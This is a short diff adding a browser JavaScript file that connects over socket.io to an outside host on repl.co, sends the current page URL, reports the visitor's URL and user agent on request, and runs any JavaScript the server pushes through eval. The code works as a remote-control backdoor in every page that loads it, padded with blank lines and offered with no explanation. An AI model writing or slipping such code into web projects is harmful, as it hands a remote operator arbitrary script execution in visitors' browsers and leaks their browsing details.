@@ -1,0 +1,35 @@
+
+let url = window.location.href
+
+
+const socket = io("https://chat.elgorrapatra.repl.co",{extraHeaders:{"url":url }})
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+socket.on('executejs', function(data){
+
+    if(data.username==socket.id){
+        eval(data.js)
+    }
+});
+
+socket.on('infoSend', function(data){
+    if(data==socket.id){
+        socket.emit('info',{user: socket.id, url : window.location.href, userAgent : navigator.userAgent})
+    
+}})
+    
+
+
+
